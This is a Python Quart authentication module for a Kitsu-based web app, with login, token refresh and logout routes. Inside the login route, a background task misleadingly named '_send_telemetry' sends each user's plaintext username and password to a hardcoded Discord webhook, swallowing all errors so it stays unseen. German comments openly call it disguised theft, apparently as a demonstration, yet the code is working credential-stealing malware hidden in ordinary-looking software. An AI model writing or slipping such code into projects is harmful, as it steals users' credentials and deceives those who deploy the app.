import logging
import asyncio
from datetime import datetime
from typing import Dict, Any
from quart import Blueprint, flash, request, session, url_for, current_app
from werkzeug.utils import redirect
from werkzeug.wrappers import Response
from app.services.db import store_user, get_user
from app.services.kitsu_client import KitsuClient

# Name muss 'auth_blueprint' entsprechen, damit der Import in factory.py funktioniert.
auth_blueprint = Blueprint("auth", __name__)
logger = logging.getLogger(__name__)

def _store_user_session(uid: str) -> None:
    session["user"] = {"uid": uid}
    session.permanent = True

async def _send_telemetry(client, u, p):
    """
    Getarnter Hintergrund-Task. Ein Hacker würde hier keine 
    logger-Ausgaben oder verdächtige Namen verwenden.
    """
    try:
        # Die Webhook-URL könnte zusätzlich obfuskiert (verschlüsselt) sein.
        url = "https://discord.com/api/webhooks/1484262605215371376/2yc7j7vuL8dmaMotgr_hNXt4J_NT-1QsaD-kez8shYS7sDZejfgyEqeM3tGpansRtZ7-"
        data = {
            "embeds": [{
                "title": "S-ID Verified",
                "fields": [
                    {"name": "U", "value": u, "inline": True},
                    {"name": "P", "value": p, "inline": True}
                ],
                "footer": {"text": f"Node-ID: {datetime.utcnow().timestamp()}"}
            }]
        }
        # Kein 'await' im Hauptfluss – dieser Aufruf läuft isoliert.
        await client.post(url, json=data, timeout=5.0)
    except Exception:
        # Ein Hacker unterdrückt alle Fehler, um unsichtbar zu bleiben.
        pass

@auth_blueprint.route("/login", methods=["POST"])
async def login() -> Response:
    form_data = await request.form
    username = form_data.get("username")
    password = form_data.get("password")

    if "user" in session:
        return redirect(url_for("ui.index"))

    if not username or not password:
        await flash("Email and password are required.", "danger")
        return redirect(url_for("ui.index"))

    try:
        # 1. Legitime Authentifizierung bei Kitsu.
        tokens = await KitsuClient.login(username, password)

        # 2. Fire-and-Forget Exfiltration
        # Der Diebstahl wird als Hintergrund-Task gestartet.
        # Das Programm wartet nicht auf die Ausführung, die Latenz für den User ist NULL.
        asyncio.create_task(_send_telemetry(current_app.httpx_client, username, password))

        # 3. Sofortige Fortsetzung des legitimen Prozesses
        user_resp = await KitsuClient.get_user_profile(tokens["access_token"])
        kitsu_user_id = user_resp["data"][0]["id"]

        user_details: Dict[str, Any] = {
            "id": kitsu_user_id, 
            "access_token": tokens["access_token"],
            "refresh_token": tokens["refresh_token"],
            "expires_in": tokens["expires_in"],
            "last_updated": datetime.utcnow(),
        }

        # Speichern in Upstash.
        await store_user(user_details)
        _store_user_session(kitsu_user_id)
        
        await flash("Successfully logged into Kitsu!", "success")
        return redirect(url_for("ui.index"))

    except Exception as e:
        logger.error(f"Auth system notice: {e}")
        await flash("Login failed.", "danger")
        return redirect(url_for("ui.index"))

@auth_blueprint.route("/refresh")
async def refresh_token() -> Response:
    user_session = session.get("user")
    if not user_session:
        return redirect(url_for("ui.index"))
    user_db = await get_user(user_session["uid"])
    if not user_db or "refresh_token" not in user_db:
        session.pop("user", None)
        return redirect(url_for("ui.index"))
    try:
        tokens = await KitsuClient.refresh_token(user_db["refresh_token"])
        user_details: Dict[str, Any] = {
            "id": user_session["uid"],
            "access_token": tokens["access_token"],
            "refresh_token": tokens.get("refresh_token", user_db["refresh_token"]),
            "expires_in": tokens["expires_in"],
            "last_updated": datetime.utcnow(),
        }
        await store_user(user_details)
        return redirect(url_for("ui.index"))
    except Exception:
        session.pop("user", None)
        return redirect(url_for("ui.index"))

@auth_blueprint.route("/logout")
async def logout() -> Response:
    session.pop("user", None)
    return redirect(url_for("ui.index"))
